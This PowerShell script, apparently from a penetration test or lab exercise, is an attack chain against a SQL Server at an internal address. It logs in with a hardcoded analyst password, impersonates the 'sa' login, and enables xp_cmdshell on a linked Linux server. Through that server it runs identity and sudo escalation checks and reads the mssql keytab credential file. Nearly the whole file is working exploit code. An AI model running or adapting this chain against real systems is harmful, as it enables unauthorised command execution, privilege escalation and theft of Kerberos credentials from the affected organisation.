# Branch D: enable xp_cmdshell on linux01 via linked server, then exec
$ErrorActionPreference = "Continue"
Add-Type -AssemblyName System.Data
$connStr = "Server=192.168.77.22;Database=master;Integrated Security=false;User ID=analyst_t1;Password=T13r_An@lyst!;TrustServerCertificate=True;"
$conn = New-Object System.Data.SqlClient.SqlConnection($connStr)
$conn.Open()
Write-Output "SQL_OK: connected to mbr01 as analyst_t1"

function Invoke-Reader($sql) {
  $c = $conn.CreateCommand()
  $c.CommandText = "EXECUTE AS LOGIN = 'sa'; $sql; REVERT"
  $r = $c.ExecuteReader()
  while ($r.Read()) { for ($i=0; $i -lt $r.FieldCount; $i++) { if (-not $r.IsDBNull($i)) { Write-Output $r.GetValue($i) } } }
  $r.Close()
}
function Invoke-NoQuery($sql) {
  $c = $conn.CreateCommand()
  $c.CommandText = "EXECUTE AS LOGIN = 'sa'; $sql; REVERT"
  $c.ExecuteNonQuery() | Out-Null
}

Write-Output "=== enable xp_cmdshell on linux01 ==="
try {
  Invoke-NoQuery "EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE; sp_configure ''xp_cmdshell'', 1; RECONFIGURE') AT LINUX01;"
  Write-Output "ENABLED_OK"
} catch { Write-Output "enable err: $($_.Exception.Message)" }

Write-Output "=== whoami on linux01 ==="
try {
  Invoke-Reader "EXEC ('exec master..xp_cmdshell ''whoami''') AT LINUX01;"
} catch { Write-Output "whoami err: $($_.Exception.Message)" }

Write-Output "=== id / groups on linux01 ==="
try {
  Invoke-Reader "EXEC ('exec master..xp_cmdshell ''id && groups''') AT LINUX01;"
} catch { Write-Output "id err: $($_.Exception.Message)" }

Write-Output "=== sudo -l (escalation check) ==="
try {
  Invoke-Reader "EXEC ('exec master..xp_cmdshell ''echo "" | sudo -S -l 2>&1''') AT LINUX01;"
} catch { Write-Output "sudo err: $($_.Exception.Message)" }

Write-Output "=== mssql keytab read (WT046 - mssql can read own keytab) ==="
try {
  Invoke-Reader "EXEC ('exec master..xp_cmdshell ''cat /var/opt/mssql/secrets/mssql.keytab | head -c 200''') AT LINUX01;"
} catch { Write-Output "keytab err: $($_.Exception.Message)" }

$conn.Close()
Write-Output "=== BRANCHD_EXEC_DONE ==="
